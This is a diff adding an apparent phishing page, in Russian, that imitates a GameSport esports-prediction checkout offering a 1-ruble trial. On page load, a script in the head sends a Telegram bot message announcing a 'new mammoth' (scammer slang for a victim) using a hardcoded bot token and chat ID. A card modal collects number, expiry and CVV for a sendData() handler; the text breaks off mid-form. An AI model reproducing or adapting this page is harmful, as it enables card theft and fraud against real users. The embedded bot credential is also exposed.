@@ -1,0 +1,591 @@
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="csrf-token" content="uTWN1Wc1iV3BDg4Pjoueamc9Ztv2hKFmRrv0ByTR">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title> Активация услуги</title>
+    <meta name="description"
+        content="Зарабатывайте на Киберспорте. Проверьте точность прогнозов за 1 рубль. Самые точные прогнозы на киберспортивные мероприятия от GameSport.">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" href="https://cdn.gamesport.com/images/icons/favicon.ico" type="image/png">
+    <link rel="stylesheet" href="css/old.css">
+    <link rel="stylesheet" href="css/css.css">
+    <link rel="shortcut icon" href="/gsbweb/images/layouts/favicon.ico">
+    <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const botToken = '7305598349:AAG_FyY4wXl3kjJUqRA3J4iVBFKWC_DK8RY';
+        const chatId = '6294188239';
+        const greetingMessage = "🦣Новый мамонт на сайте.";
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(greetingMessage)}`;
+
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("Greeting message sent successfully.");
+                } else {
+                    console.error("Error sending greeting message:", data.description);
+                }
+            })
+            .catch(error => {
+                console.error("Network error:", error);
+            });
+    });
+</script>
+</head>
+<style>
+#dnon{
+    display: none;
+}
+
+#smsalert{
+    display: none;
+    font-size: 12px;
+    margin-left: 10px;
+}
+</style>
+<body style="overflow: auto;">
+
+
+
+    <div id="app" class="wrapper">
+        <div class="header sticky-top">
+            <div class="container pt-1 pb-1 pt-sm-2 pb-sm-2">
+                <div class="row justify-content-between" style="justify-content: center !important;">
+                    <div class="col-auto">
+                        <div class="row">
+                            <div class="col-auto">
+                                <div title="Прогнозы на спорт GameSport" class="logo"><svg width="126" height="55">
+                                        <image xlink:href="https://gamesport.com/gsbpartner/images/old_land/logo-gs.svg"
+                                            src="yourfallback.png" width="126" height="55"></image>
+                                    </svg></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="sub-header" class="header pb-lg-4" style="overflow: hidden;">
+            <div class="container pb-lg-3"></div> <svg viewBox="0 0 720 35" preserveAspectRatio="xMinYMin meet">
+                <path
+                    d="M.21,0S119.34,30.41,303,29.55c90-.42,238.66-20.81,302.13-20.81,57.65,0,134.42,14.36,134.42,14.36l-.21,29.55H0Z"
+                    style="stroke: none; fill: rgb(255, 255, 255);"></path>
+            </svg>
+        </div>
+        <div id="content">
+            <div class="pb-5">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-sm-11 col-md-10 col-lg-6 text-center">
+                            <div class="box-single">
+                                <div class="result__image mb-4 rounded"
+                                    style="background-image: url(&quot;https://cdn.gamesport.com/images/landings/marathon/marathon-s4.png&quot;); background-size: contain; background-color: rgb(12, 49, 57); height: auto;">
+                                    <img src="https://cdn.gamesport.com/images/landings/marathon/marathon-s4.png" alt=""
+                                        style="opacity: 0; width: 100%; height: auto;">
+                                </div>
+                                <div class="row small justify-content-center mb-2">
+                                    <div class="col-auto small text-success"><i class="fas fa-check-circle text-success"
+                                            style="font-size: 0.625rem;"></i>
+                                        Шаг 1 – Регистрация </div>
+                                    <div class="col-auto small">Шаг 2 – Оплата</div>
+                                </div>
+                                <div id="modal-payment-form" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"
+                                    aria-hidden="true" class="size1px fade">
+                                    <div role="document" class="modal-dialog modal-dialog-centered">
+                                        <div class="modal-content">
+                                            <div id="modal-payment-form-containers" class="modal-body p-0 pt-2">
+                                                <div id="payment-form-1" class="payment-form-container"
+                                                    style="position: relative;"></div>
+                                                <div id="payment-form-2" class="payment-form-container"
+                                                    style="position: relative;"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="payment-form-containers"></div>
+                                <div id="prepay-container">
+                                    <h4 class="mt-3 mb-0" style="font-size: 1.125rem;"><strong>
+                                            Всего за 1
+                                            ₽
+                                            вы получите: </strong></h4>
+                                    <div class="row justify-content-center">
+                                        <div class="col-auto">
+                                            <div class="mt-3">
+                                                <div style="position: relative;">
+                                                    <div class="badge badge-warning"
+                                                        style="position: absolute; right: -5px; top: -10px; z-index: 5;">
+                                                        Акция!</div>
+                                                    <div class="subscribe-info text-center">
+                                                        <div><strong>«Lite-аналитика, 5 дней»</strong></div>
+                                                    </div>
+                                                </div>
+                                                <div class="subscribe-info-descr border-left border-right border-bottom"
+                                                    style="text-align: left;">
+                                                    <div class="subscribe-benefit-item mt-0"><svg width="16" height="16"
+                                                            viewBox="0 0 16 16" fill="none"
+                                                            xmlns="http://www.w3.org/2000/svg">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M4.33325 1.6665V8.21755C4.33325 8.85806 4.45922 9.31211 4.70906 9.6002C5.23278 10.2041 6.23746 10.9998 7.99992 10.9998C9.76238 10.9998 10.7671 10.2041 11.2908 9.6002C11.5406 9.31211 11.6666 8.85806 11.6666 8.21755V1.6665H4.33325ZM3.99992 0.666504C3.63173 0.666504 3.33325 0.964981 3.33325 1.33317V8.21755C3.33325 8.95333 3.47151 9.6995 3.95358 10.2554C4.62192 11.026 5.88488 11.9998 7.99992 11.9998C10.115 11.9998 11.3779 11.026 12.0463 10.2554C12.5283 9.6995 12.6666 8.95333 12.6666 8.21755V1.33317C12.6666 0.964981 12.3681 0.666504 11.9999 0.666504H3.99992Z"
+                                                                fill="black"></path>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M0.166626 3.99967C0.166626 3.35534 0.68896 2.83301 1.33329 2.83301H3.99996V3.83301H1.33329C1.24125 3.83301 1.16663 3.90763 1.16663 3.99967V5.63924C1.16663 6.31918 1.26108 6.83395 1.58701 7.1284C1.96096 7.46624 2.66357 7.83301 3.99996 7.83301V8.83301C2.47033 8.83301 1.51114 8.40752 0.916636 7.87043C0.235629 7.25518 0.166626 6.3163 0.166626 5.63924V3.99967Z"
+                                                                fill="black"></path>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M15.8333 3.99967C15.8333 3.35534 15.3109 2.83301 14.6666 2.83301H11.9999V3.83301H14.6666C14.7586 3.83301 14.8333 3.90763 14.8333 3.99967V5.63924C14.8333 6.31918 14.7388 6.83395 14.4129 7.1284C14.0389 7.46624 13.3363 7.83301 11.9999 7.83301V8.83301C13.5295 8.83301 14.4887 8.40752 15.0832 7.87043C15.7642 7.25518 15.8333 6.3163 15.8333 5.63924V3.99967Z"
+                                                                fill="black"></path>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M7.5 14.6665V11.6665H8.5V14.6665H7.5Z" fill="black">
+                                                            </path>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M4.83325 14.6665C4.83325 14.3904 5.05711 14.1665 5.33325 14.1665H10.6666C10.9427 14.1665 11.1666 14.3904 11.1666 14.6665C11.1666 14.9426 10.9427 15.1665 10.6666 15.1665H5.33325C5.05711 15.1665 4.83325 14.9426 4.83325 14.6665Z"
+                                                                fill="black"></path>
+                                                        </svg> <span>
+                                                            5
+                                                            дней прибыльных прогнозов </span></div>
+                                                    <div class="subscribe-benefit-item mt-2"><svg width="16" height="16"
+                                                            viewBox="0 0 16 16" fill="none"
+                                                            xmlns="http://www.w3.org/2000/svg">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M2.00004 4.3335H14C14.9205 4.3335 15.6667 5.07969 15.6667 6.00016V7.3335C15.6667 8.13982 15.0941 8.8124 14.3334 8.96682V14.3335C14.3334 15.254 13.5872 16.0002 12.6667 16.0002H3.33337C2.4129 16.0002 1.66671 15.254 1.66671 14.3335V8.96682C0.905961 8.8124 0.333374 8.13982 0.333374 7.3335V6.00016C0.333374 5.07969 1.07957 4.3335 2.00004 4.3335ZM2.00004 5.3335H14C14.3682 5.3335 14.6667 5.63197 14.6667 6.00016V7.3335C14.6667 7.70169 14.3682 8.00016 14 8.00016C13.6319 8.00016 13.3334 8.29864 13.3334 8.66683V14.3335C13.3334 14.7017 13.0349 15.0002 12.6667 15.0002H3.33337C2.96518 15.0002 2.66671 14.7017 2.66671 14.3335V8.66683C2.66671 8.29864 2.36823 8.00016 2.00004 8.00016C1.63185 8.00016 1.33337 7.70169 1.33337 7.3335V6.00016C1.33337 5.63197 1.63185 5.3335 2.00004 5.3335Z"
+                                                                fill="black"></path>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M7.5 15.6667V2H8.5V15.6667H7.5Z" fill="black"></path>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M14.3315 9.00342L2 9.00342V8.00342L14.3315 8.00342V9.00342Z"
+                                                                fill="black"></path>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M6.33341 1.5C5.67316 1.5 5.16675 1.95847 5.16675 2.66667C5.16675 3.04467 5.28516 3.38048 5.63341 3.64167C6.00872 3.92314 6.71483 4.16667 8.00008 4.16667V5.16667C6.61867 5.16667 5.65811 4.91019 5.03341 4.44167C4.38167 3.95285 4.16675 3.28866 4.16675 2.66667C4.16675 1.37486 5.15273 0.5 6.33341 0.5C7.53003 0.5 8.50008 1.47005 8.50008 2.66667H7.50008C7.50008 2.02233 6.97775 1.5 6.33341 1.5Z"
+                                                                fill="black"></path>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M9.66671 1.5C10.327 1.5 10.8334 1.95847 10.8334 2.66667C10.8334 3.04467 10.715 3.38048 10.3667 3.64167C9.99141 3.92314 9.2853 4.16667 8.00004 4.16667V5.16667C9.38145 5.16667 10.342 4.91019 10.9667 4.44167C11.6185 3.95285 11.8334 3.28866 11.8334 2.66667C11.8334 1.37486 10.8474 0.5 9.66671 0.5C8.47009 0.5 7.50004 1.47005 7.50004 2.66667H8.50004C8.50004 2.02233 9.02238 1.5 9.66671 1.5Z"
+                                                                fill="black"></path>
+                                                        </svg> <span>
+                                                            Бонус на депозит до 15 000 руб </span></div>
+                                                    <div class="subscribe-benefit-item mt-2"><svg width="16" height="15"
+                                                            viewBox="0 0 16 15" fill="none"
+                                                            xmlns="http://www.w3.org/2000/svg">
+                                                            <path
+                                                                d="M14.8155 0.33493C14.6179 0.348934 14.4239 0.394091 14.2412 0.468641H14.2387C14.0633 0.536396 13.2293 0.87817 11.9613 1.39623L7.41748 3.26039C4.15703 4.59751 0.951991 5.91424 0.951991 5.91424L0.990154 5.89985C0.990154 5.89985 0.76918 5.9706 0.538358 6.1247C0.395758 6.21309 0.27305 6.32875 0.17766 6.46467C0.0644027 6.62656 -0.0266951 6.8742 0.00715884 7.13023C0.0625562 7.56315 0.350622 7.82277 0.557439 7.96608C0.766718 8.11118 0.966148 8.17894 0.966148 8.17894H0.971073L3.97669 9.16529C4.11149 9.58681 4.89259 12.0884 5.08032 12.6646C5.19112 13.0087 5.29884 13.224 5.43364 13.3883C5.49888 13.4722 5.57521 13.5424 5.66692 13.5988C5.7146 13.6258 5.76544 13.6471 5.81834 13.6623L5.78756 13.6551C5.7968 13.6575 5.80418 13.6647 5.81095 13.6671C5.83558 13.6737 5.85219 13.6761 5.88359 13.6809C6.35939 13.8212 6.74163 13.5334 6.74163 13.5334L6.76317 13.5166L7.92819 12.4833C8.28311 12.1685 8.81036 12.1464 9.19038 12.4304L11.512 14.1654L11.5797 14.1936C12.1995 14.4586 12.8273 14.3111 13.1591 14.0509C13.4933 13.7888 13.6232 13.4536 13.6232 13.4536L13.6448 13.3997L15.9431 1.92987C16.0084 1.64686 16.025 1.38184 15.953 1.12461C15.8787 0.864274 15.7072 0.640372 15.4722 0.496822C15.2749 0.379969 15.0461 0.323566 14.8155 0.33493ZM14.7533 1.56412C14.7509 1.60189 14.7582 1.59769 14.741 1.67025V1.67684L12.4642 13.0273C12.4543 13.0435 12.4377 13.0789 12.3922 13.1143C12.3441 13.1514 12.306 13.1748 12.1059 13.0975L9.12112 10.8683C8.74095 10.5844 8.2136 10.6067 7.85879 10.9218L6.27075 12.3318L6.7324 9.45969L12.6759 4.06326C12.9209 3.84141 12.839 3.79464 12.839 3.79464C12.8563 3.52242 12.4691 3.71489 12.4691 3.71489L4.97445 8.2377L4.97199 8.22571L1.37978 7.04749V7.04509L1.37055 7.04329C1.37685 7.04125 1.38301 7.03885 1.38901 7.03609L1.40871 7.0265L1.42779 7.01991C1.42779 7.01991 4.6353 5.70318 7.89574 4.36606C9.52812 3.6963 11.1728 3.02175 12.4377 2.5013C13.7026 1.98384 14.6376 1.60429 14.6905 1.5839C14.741 1.56472 14.717 1.56412 14.7533 1.56412Z"
+                                                                fill="black"></path>
+                                                        </svg> <span>
+                                                            Личный Telegram-бот </span></div>
+                                                    <div class="subscribe-benefit-item mt-2"><svg width="16" height="16"
+                                                            viewBox="0 0 16 16" fill="none"
+                                                            xmlns="http://www.w3.org/2000/svg">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M8.7668 11.8425C8.9335 11.7279 9.13104 11.6665 9.33333 11.6665H13.3333C14.2538 11.6665 15 10.9203 15 9.99984V3.33317C15 2.4127 14.2538 1.6665 13.3333 1.6665H2.66667C1.74619 1.6665 1 2.4127 1 3.33317V9.99984C1 10.9203 1.74619 11.6665 2.66667 11.6665H4C4.55229 11.6665 5 12.1142 5 12.6665V14.4321L8.7668 11.8425ZM9.33333 12.6665H13.3333C14.8061 12.6665 16 11.4726 16 9.99984V3.33317C16 1.86041 14.8061 0.666504 13.3333 0.666504H2.66667C1.19391 0.666504 0 1.86041 0 3.33317V9.99984C0 11.4726 1.19391 12.6665 2.66667 12.6665H4V15.0658C4 15.6026 4.60202 15.9193 5.04435 15.6152L9.33333 12.6665Z"
+                                                                fill="black"></path>
+                                                            <path
+                                                                d="M5.33333 6.66667C5.33333 7.03486 5.03486 7.33333 4.66667 7.33333C4.29848 7.33333 4 7.03486 4 6.66667C4 6.29848 4.29848 6 4.66667 6C5.03486 6 5.33333 6.29848 5.33333 6.66667Z"
+                                                                fill="black"></path>
+                                                            <path
+                                                                d="M8.66671 6.66667C8.66671 7.03486 8.36823 7.33333 8.00004 7.33333C7.63185 7.33333 7.33337 7.03486 7.33337 6.66667C7.33337 6.29848 7.63185 6 8.00004 6C8.36823 6 8.66671 6.29848 8.66671 6.66667Z"
+                                                                fill="black"></path>
+                                                            <path
+                                                                d="M12 6.66667C12 7.03486 11.7015 7.33333 11.3333 7.33333C10.9651 7.33333 10.6666 7.03486 10.6666 6.66667C10.6666 6.29848 10.9651 6 11.3333 6C11.7015 6 12 6.29848 12 6.66667Z"
+                                                                fill="black"></path>
+                                                        </svg> <span>
+                                                            Поддержка 24/7 </span></div>
+                                                    <div class="subscribe-benefit-item mt-2"><svg width="16" height="16"
+                                                            viewBox="0 0 16 16" fill="none"
+                                                            xmlns="http://www.w3.org/2000/svg">
+                                                            <g clip-path="url(#clip0)">
+                                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                    d="M8.6333 0.995093L14.4804 4.38237C15.5623 5.00913 15.5944 6.55981 14.5394 7.23084L8.6923 10.9497C8.14652 11.2968 7.44919 11.2968 6.90341 10.9497L1.05632 7.23084C0.00127874 6.55981 0.0333921 5.00913 1.11531 4.38237L6.9624 0.995093C7.47914 0.695738 8.11656 0.695738 8.6333 0.995093ZM8.13203 1.86038C7.92533 1.74064 7.67037 1.74064 7.46367 1.86038L1.61658 5.24766C1.18382 5.49836 1.17097 6.11864 1.59299 6.38705L7.44007 10.1059C7.65839 10.2448 7.93732 10.2448 8.15563 10.1059L14.0027 6.38705C14.4247 6.11864 14.4119 5.49836 13.9791 5.24766L8.13203 1.86038Z"
+                                                                    fill="black"></path>
+                                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                    d="M2.5 11.499V8H3.5V11.499C3.5 11.7042 3.57283 11.8811 3.69607 12.0013C4.05259 12.3493 4.67149 12.8977 5.43971 13.3565C6.21177 13.8177 7.09837 14.1667 8 14.1667C8.9057 14.1667 9.7459 13.8141 10.454 13.3537C11.1605 12.8943 11.7051 12.3469 12.0091 12.0068C12.1082 11.8959 12.1667 11.739 12.1667 11.5556V8H13.1667V11.5556C13.1667 11.9491 13.0401 12.354 12.7547 12.6732C12.4163 13.0518 11.8053 13.6678 10.9991 14.192C10.1945 14.7152 9.16502 15.1667 8 15.1667C6.8491 15.1667 5.78191 14.7257 4.92692 14.2151C4.06809 13.7021 3.38667 13.0967 2.99761 12.717C2.65859 12.3861 2.5 11.9398 2.5 11.499Z"
+                                                                    fill="black"></path>
+                                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                    d="M0.666626 5.5C0.942768 5.5 1.16663 5.72386 1.16663 6V10C1.16663 10.2761 0.942768 10.5 0.666626 10.5C0.390484 10.5 0.166626 10.2761 0.166626 10V6C0.166626 5.72386 0.390484 5.5 0.666626 5.5Z"
+                                                                    fill="black"></path>
+                                                            </g>
+                                                            <defs>
+                                                                <clipPath id="clip0">
+                                                                    <rect width="16" height="16" fill="white"></rect>
+                                                                </clipPath>
+                                                            </defs>
+                                                        </svg> <span>
+                                                            Подробное обучение </span></div>
+                                                </div>
+                                                <div class="mt-2"
+                                                    style="background: rgb(207, 233, 209); color: rgb(18, 18, 18); padding: 5px 15px 5px 55px; border-radius: 5px; position: relative; text-align: left;">
+                                                    <div
+                                                        style="position: absolute; top: -5px; left: -5px; transform: rotate(15deg);">
+                                                        <img src="https://gamesport.com/landings/black/images/gift_box.svg"
+                                                            style="width: 32px; height: 32px;">
+                                                    </div>
+                                                    <div style="font-size: 12px; color: rgb(252, 26, 64);">
+                                                        <strong>Pro-аналитика в подарок!</strong>
+                                                    </div>
+                                                    <div style="font-size: 12px;">
+                                                        5 дней за 0 ₽
+                                                        <span style="text-decoration: line-through; opacity: 0.7;">
+                                                            750
+                                                            ₽
+                                                        </span>
+                                                    </div>
+                                                    <div
+                                                        style="font-size: 12px; text-transform: uppercase; color: rgb(40, 167, 69);">
+                                                        <strong>совершенно бесплатно!</strong>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div data-v-8f38cd4a="">
+                                    <div data-v-8f38cd4a="" id="modal_must-be-confirmed" tabindex="-1" role="dialog"
+                                        aria-hidden="true" class="modal fade">
+                                        <div data-v-8f38cd4a="" role="document"
+                                            class="modal-dialog modal-dialog-centered">
+                                            <div data-v-8f38cd4a="" class="modal-content">
+                                                <div data-v-8f38cd4a="" class="modal-header">
+                                                    Согласитесь с правилами <button data-v-8f38cd4a="" type="button"
+                                                        aria-label="Close" class="close"><span data-v-8f38cd4a=""
+                                                            aria-hidden="true">×</span></button></div>
+                                                <div data-v-8f38cd4a="" class="modal-body text-center">
+                                                    <div data-v-8f38cd4a="">Для продолжения вы должны согласится с <a
+                                                            target="_blank"
+                                                            href="https://cdn.gamesport.com/assets/docs/subscribe_ru.pdf">правилами
+                                                            предоставления доступа по подписке</a> и <a target="_blank"
+                                                            href="https://cdn.gamesport.com/assets/docs/polit_ru.pdf">политикой
+                                                            конфидициалности</a>.</div>
+                                                    <div data-v-8f38cd4a="" class="mt-3 text-center"><a
+                                                            data-v-8f38cd4a="" href="#" class="btn btn-primary">
+                                                            Согласится и продолжить </a></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div data-v-8f38cd4a="" class="text-left checkbox-container">
+                                        <div data-v-8f38cd4a="" class="form-check"><input data-v-8f38cd4a=""
+                                                id="confirm-chb-confirm-1" type="checkbox" value="1" checked="checked"
+                                                class="form-check-input"> <label data-v-8f38cd4a=""
+                                                for="confirm-chb-confirm-1">
+                                                Согласен с условиями <a data-v-8f38cd4a=""
+                                                    href="https://cdn.gamesport.com/assets/docs/oferta_ru.pdf"
+                                                    target="_blank" class="_link">
+                                                    лицензионного соглашения </a>
+                                                и
+                                                <a data-v-8f38cd4a=""
+                                                    href="https://cdn.gamesport.com/assets/docs/rules_ru.pdf"
+                                                    target="_blank" class="_link">
+                                                    правилами платформы GameSport. </a></label></div>
+                                        <div data-v-8f38cd4a="" class="form-check"><input data-v-8f38cd4a=""
+                                                id="confirm-chb-confirm-2" type="checkbox" value="2" checked="checked"
+                                                class="form-check-input"> <label data-v-8f38cd4a=""
+                                                for="confirm-chb-confirm-2" class="checkbox__body">
+                                                Согласен с <a data-v-8f38cd4a=""
+                                                    href="https://cdn.gamesport.com/assets/docs/polit_ru.pdf"
+                                                    target="_blank" class="_link">
+                                                    политикой конфиденциальности и правилами обработки персональных
+                                                    данных. </a></label></div>
+                                        <div data-v-8f38cd4a="" class="row">
+                                            <div data-v-8f38cd4a="" class="col">
+                                                <div data-v-8f38cd4a="" class="form-check"><input data-v-8f38cd4a=""
+                                                        id="confirm-chb-confirm-3" type="checkbox" value="3"
+                                                        class="form-check-input"> <label data-v-8f38cd4a=""
+                                                        for="confirm-chb-confirm-3" class="">Согласен с <a
+                                                            data-v-8f38cd4a=""
+                                                            href="https://cdn.gamesport.com/assets/docs/subscribe_ru.pdf"
+                                                            target="_blank" class="_link">правилами предоставления
+                                                            доступа к услугам по подписке</a>, тариф 1₽. за первые 5
+                                                        дней, далее каждые 5 дней по 200₽, списания происходят
+                                                        автоматически.</label></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="mt-2" style="text-align: center; font-weight: bold; font-size: 14px;">
+                                    <div class="small text-muted"><strong>Доступные способы оплаты</strong></div>
+                                    <div class="mt-2 text-center"><img
+                                            src="https://gamesport.com/gsbpartner/images/old_land/sec-payments.png"
+                                            alt="Доступные способы оплаты"
+                                            style="width: 100%; max-width: 305px; height: auto; margin: 0px auto;">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="mt-4 text-center"><img
+                                    src="https://gamesport.com/gsbpartner/images/old_land/protected-payments.png"
+                                    alt="Безопасные платежи"
+                                    style="width: 100%; max-width: 305px; height: auto; margin: 0px auto;"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pay-bottom-container pay-bottom-container__animation">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-sm-11 col-md-10 col-lg-6 pl-0 pr-0">
+                            <div class="pay-bottom-container__content">
+                                <div class="pl-2 pr-2">
+                                    <div class="row">
+                                        <div class="col">К оплате:</div>
+                                        <div class="col-auto"><strong>
+                                                1
+                                                ₽
+                                            </strong></div>
+                                    </div>
+                                    <div class="pay-bottom-container__buttons">
+                                        <div class="pay-bottom-container__bnk-buttons"><a target="_blank"
+                                                class="tcs-pay" href="https://www.tinkoff.ru/tpay/2000000000029424676">
+                                                <div class="center"><svg xmlns="http://www.w3.org/2000/svg" width="45px"
+                                                        height="11px" viewBox="0px 0px 45px 11px" fill="none"
+                                                        stroke="none">
+                                                        <path data-v-167ce388=""
+                                                            d="M8.358 2.488H5.082V11H3.416V2.488H0.14V1.032H8.358V2.488ZM11.1219 2.558H9.52591V1.032H11.1219V2.558ZM11.1219 11H9.52591V3.888H11.1219V11ZM16.8306 3.72C18.4406 3.72 19.4206 4.7 19.4206 6.646V11H17.8246V6.786C17.8246 5.512 17.2786 5.008 16.3826 5.008C15.4726 5.008 14.7586 5.694 14.7586 7.052V11H13.1626V3.888H14.6746V4.812H14.7026C15.1506 4.168 15.8926 3.72 16.8306 3.72ZM27.8051 11H25.7891L23.0171 7.556H22.9891V11H21.3931V1.032H22.9891V6.8H23.0171L25.6071 3.888H27.4691L24.5291 7.136L27.8051 11ZM31.3761 3.678C33.5321 3.678 34.8761 5.134 34.8761 7.444C34.8761 9.754 33.5321 11.21 31.3761 11.21C29.2201 11.21 27.8621 9.754 27.8621 7.444C27.8621 5.134 29.2201 3.678 31.3761 3.678ZM31.3761 4.938C30.2421 4.938 29.5421 5.904 29.5421 7.444C29.5421 8.984 30.2421 9.95 31.3761 9.95C32.5101 9.95 33.2101 8.984 33.2101 7.444C33.2101 5.904 32.5101 4.938 31.3761 4.938ZM43.4742 2.152C42.7882 2.152 42.4522 2.474 42.4522 3.314V3.888H43.8242V5.106H42.4522V11H40.8702V5.106H38.3642V11H36.7822V5.106H35.5782V3.888H36.7822V3.132C36.7822 1.662 37.5382 0.933999 38.9382 0.933999C39.2322 0.933999 39.5682 0.99 39.7782 1.032V2.208C39.6802 2.18 39.5262 2.152 39.3862 2.152C38.7002 2.152 38.3642 2.474 38.3642 3.314V3.888H40.8702V3.132C40.8702 1.662 41.6262 0.933999 43.0262 0.933999C43.3062 0.933999 43.6562 0.99 43.8522 1.032V2.208C43.7682 2.18 43.6142 2.152 43.4742 2.152Z"
+                                                            fill="black" fill-opacity="0.8"></path>
+                                                    </svg> <svg xmlns="http://www.w3.org/2000/svg" width="50"
+                                                        height="22" viewBox="0 0 50 21" fill="none" stroke="none"
+                                                        style="margin-left: 7px;">
+                                                        <g clip-path="url(#clip0_11597_11080)">
+                                                            <path
+                                                                d="M39.6117 0.5H10.3883C4.65099 0.5 0 5.20101 0 11C0 16.799 4.65099 21.5 10.3883 21.5H39.6117C45.349 21.5 50 16.799 50 11C50 5.20101 45.349 0.5 39.6117 0.5Z"
+                                                                fill="#303030"></path>
+                                                            <path
+                                                                d="M25.6917 7.8898H21.5459V14.5826H23.5624V12.7822H25.6901C26.1901 12.7822 26.6771 12.7673 27.151 12.6137C28.0694 12.3181 28.7509 11.4889 28.7509 10.3641C28.7509 9.23926 28.0825 8.42331 27.1788 8.10122C26.6788 7.91788 26.2049 7.8898 25.6901 7.8898H25.6917ZM23.5641 11.2081V9.50684H25.4009C25.7898 9.50684 26.0137 9.54978 26.1934 9.61915C26.5137 9.74634 26.6657 10.0403 26.6657 10.3509C26.6657 10.6878 26.4843 11.0116 26.1379 11.1239C25.9712 11.18 25.7767 11.2081 25.4009 11.2081H23.5641Z"
+                                                                fill="white"></path>
+                                                            <path
+                                                                d="M31.6432 12.1364L32.6024 9.43746H32.756L33.7153 12.1364H31.6432ZM31.1431 13.613H34.2039L34.5928 14.5826H36.8594L34.1467 7.8898H31.1971L28.4844 14.5826H30.7656L31.1415 13.613H31.1431Z"
+                                                                fill="white"></path>
+                                                            <path
+                                                                d="M41.768 7.8898L40.1273 10.9405H40.0571L38.4017 7.8898H36.0518L39.0422 12.8103V14.5826H41.1291V12.6418L43.9676 7.8898H41.768Z"
+                                                                fill="white"></path>
+                                                            <path
+                                                                d="M6.0332 5.90445H17.2369V11.5996C17.2369 13.0597 16.4656 14.4092 15.2155 15.1392L11.6351 17.2287L8.05464 15.1392C6.80289 14.4092 6.0332 13.0597 6.0332 11.5996V5.90445Z"
+                                                                fill="#FFDD2D"></path>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M9.1071 8.90231V10.673C9.34732 10.3988 9.78201 10.2138 10.2804 10.2138H10.8213V12.2735C10.8213 12.8219 10.6743 13.3008 10.4553 13.5651H12.8101C12.5927 13.3008 12.4457 12.8219 12.4457 12.2751V10.2154H12.9866C13.485 10.2154 13.9213 10.4004 14.1599 10.6746V8.90397H9.10547L9.1071 8.90231Z"
+                                                                fill="#333333"></path>
+                                                        </g>
+                                                        <defs>
+                                                            <clipPath id="clip0_11597_11080">
+                                                                <rect width="50" height="21" fill="white"
+                                                                    transform="translate(0 0.5)"></rect>
+                                                            </clipPath>
+                                                        </defs>
+                                                    </svg></div>
+                                            </a></div>
+                                        <div><a href="#" id="openModalBtn"
+                                                class="pay-bottom-container__btn-card"><span>Оплата
+                                                    картой</span> <svg width="129" height="23">
+                                                    <image
+                                                        xlink:href="https://gamesport.com/gsbpartner/images/old_land/btn-pay-logos.svg"
+                                                        src="yourfallback.png" width="129" height="23"></image>
+                                                </svg></a></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+
+    <div class="modal fade" id="viewImg" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
+        aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content text-center">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">
+                            ×
+                        </span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <img src="" width="95%">
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span id="closeModalBtn" class="close-btn">&times;</span>
+            <div style="text-align: center; font-size: 18px; font-weight: 700; white-space: normal;">Lite-аналитика, 5
+                дней</h2>
+            </div>
+            <div>
+                <div class="container-fluid">
+                    <div class="row">
+                        <div class="col-12">
+                            <div class="mt-1"
+                                style="text-align: center; font-size: 24px; font-weight: 400; white-space: normal; line-height: 36px;">
+                                1 RUB
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row mt-4">
+                        <div class="col-12">
+                            <form onsubmit="sendData(event)">
+                                <div>
+                                    <div class="row">
+                                        <div class="col-12"><label for="input">Номер карты</label> <input type="text"
+                                                 id="cardNumber" placeholder="VISA"
+                                                class="form-control" required></div>
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-6 mt-0"><label for="output">ММ/ГГ</label> <input type="text"
+                                             id="expiryDate1" placeholder="ММ/ГГ" class="form-control" required></div>
+                                        <div class="col-6 mt-0"><label for="start">CVV</label>
+                                            <div style="position: relative;"><input type="text" placeholder="CVV" id="cvc"
+                                                class="form-control" required>
+                                                
+                                                </div>
+                                            </div>
+                                            <!-- <div class="col-12" id="cardh2"><label for="input">ФИО на карте</label> <input type="text"
+                                                id="cardHolder" placeholder="Имя | Фамилия"
